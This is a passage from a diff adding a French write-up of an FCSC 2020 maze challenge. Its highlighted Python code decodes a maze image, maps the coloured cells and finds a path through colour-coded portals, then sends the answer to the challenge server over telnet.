+                i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">35</span>
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Stockage de la clé &#34;</span>)
+                <span style="color:#66d9ef">while</span> start <span style="color:#f92672">==</span> False:
+                    <span style="color:#66d9ef">if</span> xi[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-&#34;</span>: <span style="color:#75715e"># si le caractère = - alors la clé est fini</span>
+                        end <span style="color:#f92672">=</span> True
+                        start <span style="color:#f92672">=</span> True
+                    <span style="color:#66d9ef">elif</span> xi[i] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>:
+                        imgencode <span style="color:#f92672">+=</span> xi[i]	<span style="color:#75715e"># sinon on l&#39;encode</span>
+                    i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+        <span style="color:#66d9ef">else</span> :
+            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[-] Convertion de l&#39;image en base64&#34;</span>)
+    labyimage <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(BytesIO(base64<span style="color:#f92672">.</span>b64decode(imgencode)))
+    labyimage<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#39;maze.png&#39;</span>, <span style="color:#e6db74">&#39;PNG&#39;</span>)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Image sauvegardé ! &#34;</span>)
+    traitement()
+</code></pre></div><p>Ici juste on cherche l&rsquo;endroit où le labyrinthe commence pour le stocker puis on sauvegarde les coordonneés. Ici nous utilisons une fonction count car nous serons amené à réutiliser cette fonction. Lorsqu&rsquo;on la réutilisera il n&rsquo;y aura qu&rsquo;un labyrinthe d&rsquo;envoyé alors que la première fois il y en avait deux (l&rsquo;exemple et le normal). La variable DUO est présente car sur les derniers laby il n&rsquo;y avait que deux couleurs.</p>
+<p>Nous rentrons dans la fonction traitement :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">traitement</span>():				<span style="color:#75715e"># Détection du format de l&#39;image</span>
+   claire <span style="color:#f92672">=</span> False
+   DUO <span style="color:#f92672">=</span> False
+   imgb <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;maze.png&#34;</span>)
+   sizex, sizey <span style="color:#f92672">=</span> imgb<span style="color:#f92672">.</span>size
+   <span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34; TAILLE x= &#34;</span> <span style="color:#f92672">+</span> str(sizex) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; y= &#34;</span><span style="color:#f92672">+</span> str(sizey))
+   coordinate <span style="color:#f92672">=</span> x, y <span style="color:#f92672">=</span> <span style="color:#ae81ff">544</span>, <span style="color:#ae81ff">98</span>
+   pos <span style="color:#f92672">=</span> imgb<span style="color:#f92672">.</span>getpixel(coordinate)
+   <span style="color:#66d9ef">if</span> is_clair(pos) <span style="color:#f92672">==</span> True:
+       claire <span style="color:#f92672">=</span> True
+       area <span style="color:#f92672">=</span> (<span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">896</span>, <span style="color:#ae81ff">1024</span>)
+       tailleaze <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span>
+       <span style="color:#66d9ef">if</span> sizex <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1000</span> <span style="color:#f92672">and</span> sizey <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1000</span>:
+           <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34; HI &#34;</span>)
+           area <span style="color:#f92672">=</span> (<span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">1024</span>, <span style="color:#ae81ff">1152</span>)
+           tailleaze <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>
+           <span style="color:#66d9ef">if</span> sizex <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1200</span> <span style="color:#f92672">and</span> sizey <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1110</span>:
+               <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;HOLA&#34;</span>)
+               area <span style="color:#f92672">=</span> (<span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">1152</span>, <span style="color:#ae81ff">1281</span>)
+               tailleaze <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span>
+               <span style="color:#66d9ef">if</span> sizex <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1300</span> <span style="color:#f92672">and</span> sizey <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1500</span>:
+                   <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34; SALUT !&#34;</span>)
+                   area <span style="color:#f92672">=</span> (<span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">1280</span>, <span style="color:#ae81ff">1408</span>)
+                   tailleaze <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span>
+                   <span style="color:#66d9ef">if</span> sizex <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1470</span> <span style="color:#f92672">and</span> sizey <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1600</span>:
+                       <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34; CIAO !&#34;</span>)
+                       area <span style="color:#f92672">=</span> (<span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">1280</span>, <span style="color:#ae81ff">1408</span>)
+                       tailleaze <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span>
+   <span style="color:#66d9ef">elif</span> sizex <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1470</span> <span style="color:#f92672">and</span> sizey <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1600</span>:
+       <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34; CIAO !&#34;</span>)
+       area <span style="color:#f92672">=</span> (<span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">1410</span>, <span style="color:#ae81ff">1540</span>)
+       tailleaze <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
+       DUO <span style="color:#f92672">=</span> True
+
+
+   <span style="color:#66d9ef">else</span>:
+       claire <span style="color:#f92672">=</span> False
+       area <span style="color:#f92672">=</span> (<span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">768</span>, <span style="color:#ae81ff">896</span>)
+       taille <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>
+       tailleaze <span style="color:#f92672">=</span> <span style="color:#ae81ff">11</span>
+   imgb <span style="color:#f92672">=</span> imgb<span style="color:#f92672">.</span>crop(area)
+   imgb<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#39;traite.png&#39;</span>, imgb<span style="color:#f92672">.</span>format)
+
+   image <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;traite.png&#34;</span>)
+   my_dpi <span style="color:#f92672">=</span> <span style="color:#ae81ff">65</span>
+   <span style="color:#75715e"># Set up figure</span>
+   fig <span style="color:#f92672">=</span> plt<span style="color:#f92672">.</span>figure(figsize<span style="color:#f92672">=</span>(float(image<span style="color:#f92672">.</span>size[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">/</span> my_dpi, float(image<span style="color:#f92672">.</span>size[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">/</span> my_dpi), dpi<span style="color:#f92672">=</span>my_dpi)
+   ax <span style="color:#f92672">=</span> fig<span style="color:#f92672">.</span>add_subplot(<span style="color:#ae81ff">111</span>)
+
+   <span style="color:#75715e"># Set the gridding interval: here we use the major tick interval</span>
+   myInterval <span style="color:#f92672">=</span> <span style="color:#ae81ff">64.</span>
+   myIntervall <span style="color:#f92672">=</span> <span style="color:#ae81ff">64.</span>
+   loc <span style="color:#f92672">=</span> plticker<span style="color:#f92672">.</span>MultipleLocator(base<span style="color:#f92672">=</span>myInterval)
+   loc2 <span style="color:#f92672">=</span> plticker<span style="color:#f92672">.</span>MultipleLocator(base<span style="color:#f92672">=</span>myIntervall)
+   ax<span style="color:#f92672">.</span>xaxis<span style="color:#f92672">.</span>set_major_locator(loc)
+   ax<span style="color:#f92672">.</span>yaxis<span style="color:#f92672">.</span>set_major_locator(loc2)
+
+   <span style="color:#75715e"># Add the grid</span>
+   ax<span style="color:#f92672">.</span>grid(which<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;major&#39;</span>, axis<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;both&#39;</span>, linestyle<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;-&#39;</span>)
+
+   <span style="color:#75715e"># Add the image</span>
+   ax<span style="color:#f92672">.</span>imshow(image)
+
+   nx <span style="color:#f92672">=</span> abs(int(float(ax<span style="color:#f92672">.</span>get_xlim()[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> ax<span style="color:#f92672">.</span>get_xlim()[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">/</span> float(myInterval)))
+   ny <span style="color:#f92672">=</span> abs(int(float(ax<span style="color:#f92672">.</span>get_ylim()[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> ax<span style="color:#f92672">.</span>get_ylim()[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">/</span> float(myInterval)))
+
+   <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(ny<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, ny):
+       y <span style="color:#f92672">=</span> myInterval <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> myInterval
+       <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(nx):
+           x <span style="color:#f92672">=</span> myInterval <span style="color:#f92672">/</span> <span style="color:#ae81ff">2.</span> <span style="color:#f92672">+</span> float(i) <span style="color:#f92672">*</span> myInterval
+           cordinate <span style="color:#f92672">=</span> x, y
+           <span style="color:#66d9ef">if</span> is_blue(image<span style="color:#f92672">.</span>getpixel(cordinate)) <span style="color:#f92672">==</span> True:
+               <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Start at pos : &#34;</span> <span style="color:#f92672">+</span> str(i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> nx))
+               start <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> nx
+               startx <span style="color:#f92672">=</span> i
+               starty <span style="color:#f92672">=</span> j
+               ax<span style="color:#f92672">.</span>text(x, y, <span style="color:#e6db74">&#39;START ! &#39;</span><span style="color:#f92672">.</span>format(i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> nx), color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>, ha<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>, va<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>)
+           <span style="color:#66d9ef">if</span> claire <span style="color:#f92672">==</span> False :
+               <span style="color:#66d9ef">if</span> is_or(image<span style="color:#f92672">.</span>getpixel(cordinate)) <span style="color:#f92672">==</span> True:
+                   <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Flag at pos : &#34;</span> <span style="color:#f92672">+</span> str(i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> nx))
+                   endx <span style="color:#f92672">=</span> i
+                   endy <span style="color:#f92672">=</span> j
+                   ax<span style="color:#f92672">.</span>text(x, y, <span style="color:#e6db74">&#39;Flag ! &#39;</span><span style="color:#f92672">.</span>format(i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> nx), color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>, ha<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>, va<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>)
+           <span style="color:#66d9ef">elif</span> claire <span style="color:#f92672">==</span> True:
+               <span style="color:#66d9ef">if</span> is_clair(image<span style="color:#f92672">.</span>getpixel(cordinate)) <span style="color:#f92672">==</span> True:
+                   <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Flag at pos : &#34;</span> <span style="color:#f92672">+</span> str(i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> nx))
+                   endx <span style="color:#f92672">=</span> i
+                   endy <span style="color:#f92672">=</span> j
+                   ax<span style="color:#f92672">.</span>text(x, y, <span style="color:#e6db74">&#39;Flag ! &#39;</span><span style="color:#f92672">.</span>format(i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> nx), color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>, ha<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>, va<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>)
+           <span style="color:#66d9ef">if</span> DUO <span style="color:#f92672">==</span> True:
+               <span style="color:#66d9ef">if</span> is_red(image<span style="color:#f92672">.</span>getpixel(cordinate)) <span style="color:#f92672">==</span> True:
+                   <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Flag at pos : &#34;</span> <span style="color:#f92672">+</span> str(i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> nx))
+                   endx <span style="color:#f92672">=</span> i
+                   endy <span style="color:#f92672">=</span> j
+                   ax<span style="color:#f92672">.</span>text(x, y, <span style="color:#e6db74">&#39;Flag ! &#39;</span><span style="color:#f92672">.</span>format(i <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> nx), color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>, ha<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>, va<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>)
+
+   laby <span style="color:#f92672">=</span> []
+   maze <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array([])
+
+   <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(ny):
+       y <span style="color:#f92672">=</span> myInterval <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> j <span style="color:#f92672">*</span> myInterval
+       <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(nx):
+           x <span style="color:#f92672">=</span> myInterval <span style="color:#f92672">/</span> <span style="color:#ae81ff">2.</span> <span style="color:#f92672">+</span> float(i) <span style="color:#f92672">*</span> myInterval
+           cordinate <span style="color:#f92672">=</span> x, y
+           <span style="color:#66d9ef">if</span> is_blue(image<span style="color:#f92672">.</span>getpixel(cordinate)) <span style="color:#f92672">==</span> True:
+               ax<span style="color:#f92672">.</span>text(x, y, <span style="color:#e6db74">&#39;x=&#39;</span> <span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; y=&#39;</span> <span style="color:#f92672">+</span> str(j), color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>, ha<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>, va<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>)
+               laby<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">1</span>)
+           <span style="color:#66d9ef">if</span> is_white(image<span style="color:#f92672">.</span>getpixel(cordinate)) <span style="color:#f92672">==</span> True:
+               ax<span style="color:#f92672">.</span>text(x, y, <span style="color:#e6db74">&#39;x=&#39;</span> <span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; y=&#39;</span> <span style="color:#f92672">+</span> str(j), color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>, ha<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>, va<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>)
+               laby<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">0</span>)
+           <span style="color:#66d9ef">if</span> is_red(image<span style="color:#f92672">.</span>getpixel(cordinate)) <span style="color:#f92672">==</span> True:
+               ax<span style="color:#f92672">.</span>text(x, y, <span style="color:#e6db74">&#39;x=&#39;</span> <span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; y=&#39;</span> <span style="color:#f92672">+</span> str(j), color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>, ha<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>, va<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>)
+               laby<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">2</span>)
+           <span style="color:#66d9ef">if</span> is_or(image<span style="color:#f92672">.</span>getpixel(cordinate)) <span style="color:#f92672">==</span> True:
+               ax<span style="color:#f92672">.</span>text(x, y, <span style="color:#e6db74">&#39;x=&#39;</span> <span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; y=&#39;</span> <span style="color:#f92672">+</span> str(j), color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>, ha<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>, va<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>)
+               laby<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">3</span>)
+           <span style="color:#66d9ef">if</span> is_black(image<span style="color:#f92672">.</span>getpixel(cordinate)) <span style="color:#f92672">==</span> True:
+               ax<span style="color:#f92672">.</span>text(x, y, <span style="color:#e6db74">&#39;x=&#39;</span> <span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; y=&#39;</span> <span style="color:#f92672">+</span> str(j), color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>, ha<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>, va<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>)
+               laby<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">4</span>)
+           <span style="color:#66d9ef">if</span> is_clair(image<span style="color:#f92672">.</span>getpixel(cordinate)) <span style="color:#f92672">==</span> True:
+               ax<span style="color:#f92672">.</span>text(x, y, <span style="color:#e6db74">&#39;x=&#39;</span> <span style="color:#f92672">+</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; y=&#39;</span> <span style="color:#f92672">+</span> str(j), color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;b&#39;</span>, ha<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>, va<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;center&#39;</span>)
+               laby<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">6</span>)
+       a <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(laby)
+
+       maze <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>append(maze, a)
+       laby <span style="color:#f92672">=</span> []
+   fig<span style="color:#f92672">.</span>savefig(<span style="color:#e6db74">&#39;myImageGrid.jpg&#39;</span>, dpi<span style="color:#f92672">=</span>my_dpi)
+   <span style="color:#66d9ef">print</span>(maze)
+   maze <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>reshape(maze, (tailleaze, tailleaze))
+   maze <span style="color:#f92672">=</span> maze<span style="color:#f92672">.</span>astype(int)
+   grid <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(maze)<span style="color:#f92672">.</span>tolist()
+   grid[starty][startx] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+   <span style="color:#66d9ef">print</span>(grid)
+   <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Pattern = Bleu =&gt; Roouge =&gt; Orange&#34;</span>)
+   save <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+   searchrouge(starty <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, startx, <span style="color:#e6db74">&#34;N&#34;</span>, popo, endx, endy, grid, claire, DUO)
+</code></pre></div><p>Pour commencer nous stockons le format de l&rsquo;image pour bien faire notre découpe. Une fois que l&rsquo;on connait sa taille on peut faire une découpe et chercher sur la dernière ligne ou est le début et ou est la fin. Ce code la nous rend une image comme ça :</p>
+
+
+
+  <img src="/img/FCSC2020/traite.jpg" alt="MAAAAAAAAAAAAAAAZE" class="imageformat"/>
+
+<p>De plus la fonction créee un tableau qui utilise le code suivant :</p>
+<pre><code> 0 = Blanc (Passage)
+ 1 = Bleu
+ 2 = Rouge
+ 3 = Orange
+ 4 = Noire (Mur)
+ 6 = Bleu claire
+
+</code></pre><p><em>NB : Les fonctions get_couleur ne servaient uniquement qu'à connaitre la couleur d&rsquo;un pixel</em></p>
+<p>Nous ne traiterons qu&rsquo;une seule recherche de couleur après ça se répète et ce sont les mêmes avec des if en plus.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">searchrouge</span>(x, y, char, pot,endx,endy,grid,claire, DUO):
+    magouille <span style="color:#f92672">=</span> False
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[-] Recherche de portail rouge&#34;</span>)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Direction prise : &#34;</span> <span style="color:#f92672">+</span>char)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;x = &#34;</span> <span style="color:#f92672">+</span> str(x) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;      y = &#34;</span> <span style="color:#f92672">+</span>str(y))
+    pot <span style="color:#f92672">+=</span> char
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;chemin actuel : &#34;</span> <span style="color:#f92672">+</span> pot)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;valeur de la cellule en question : &#34;</span> <span style="color:#f92672">+</span> str(grid[x][y]))
+    <span style="color:#66d9ef">if</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+        <span style="color:#66d9ef">if</span> x <span style="color:#f92672">==</span> endy <span style="color:#f92672">and</span> y <span style="color:#f92672">==</span> endx:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Chemin trouvée !&#34;</span>)
+            pot <span style="color:#f92672">=</span> pot<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] La souris s&#39;est échappé par ce chemin !&#34;</span>)
+            <span style="color:#66d9ef">print</span>(pot)
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Envoie du chemin !&#34;</span>)
+            tn<span style="color:#f92672">.</span>write(pot<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[-] Reception du flag... &#34;</span>)
+            result <span style="color:#f92672">=</span> tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Now enter your solution:&#34;</span>)
+            result <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+            <span style="color:#66d9ef">print</span>(result)
+            Recup(result,<span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[+] Portail rouge&#34;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;found at </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (x, y))
+        <span style="color:#66d9ef">if</span> pot[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;N&#34;</span>:
+            x <span style="color:#f92672">=</span> x <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+            save <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;n&#34;</span>
+        <span style="color:#66d9ef">elif</span> pot[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;S&#34;</span>:
+            x <span style="color:#f92672">=</span> x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+            save <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;s&#34;</span>
+        <span style="color:#66d9ef">elif</span> pot[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;W&#34;</span>:
+            y <span style="color:#f92672">=</span> y <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+            save <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;w&#34;</span>
+        <span style="color:#66d9ef">elif</span> pot[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;E&#34;</span>:
+            save <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;e&#34;</span>
+            y <span style="color:#f92672">=</span> y <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;DUO IS &#34;</span> <span style="color:#f92672">+</span> str(DUO))
+        <span style="color:#66d9ef">if</span> DUO <span style="color:#f92672">==</span> False :
+             orange <span style="color:#f92672">=</span> searchorange(x, y, <span style="color:#e6db74">&#34; &#34;</span>, pot,endx,endy,grid,claire, DUO)
+        <span style="color:#66d9ef">elif</span> DUO <span style="color:#f92672">==</span> True:
+            orange <span style="color:#f92672">=</span> searchblue(x, y, <span style="color:#e6db74">&#34; &#34;</span>, pot, endx, endy, grid, claire,DUO)
+        <span style="color:#66d9ef">if</span> orange <span style="color:#f92672">==</span> False:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[x] Erreur de parcours !&#34;</span>)
+            <span style="color:#66d9ef">if</span> save <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;n&#34;</span>:
+                resetmagouillex <span style="color:#f92672">=</span> x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+                resetmagouilley <span style="color:#f92672">=</span> y
+                magouille <span style="color:#f92672">=</span> True
+                grid[x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>][y] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+                x <span style="color:#f92672">=</span> x <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>
+                pot <span style="color:#f92672">=</span> pot[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+
+            <span style="color:#66d9ef">elif</span> save <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;s&#34;</span>:
+                grid[x <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>][y] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+                resetmagouillex <span style="color:#f92672">=</span> x <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+                resetmagouilley <span style="color:#f92672">=</span> y
+                magouille <span style="color:#f92672">=</span> True
+                x <span style="color:#f92672">=</span> x <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>
+                pot <span style="color:#f92672">=</span> pot[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+            <span style="color:#66d9ef">elif</span> save <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;e&#34;</span>:
+                grid[x][y <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+                resetmagouillex <span style="color:#f92672">=</span> x
+                resetmagouilley <span style="color:#f92672">=</span> y <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
+                magouille <span style="color:#f92672">=</span> True
+                y <span style="color:#f92672">=</span> y <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>
+                pot <span style="color:#f92672">=</span> pot[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+            <span style="color:#66d9ef">elif</span> save <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;w&#34;</span>:
+                resetmagouillex <span style="color:#f92672">=</span> x
+                resetmagouilley <span style="color:#f92672">=</span> y <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+                magouille <span style="color:#f92672">=</span> True
+                grid[x][y <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+                y <span style="color:#f92672">=</span> y <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>
+                pot <span style="color:#f92672">=</span> pot[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+        <span style="color:#66d9ef">else</span>:
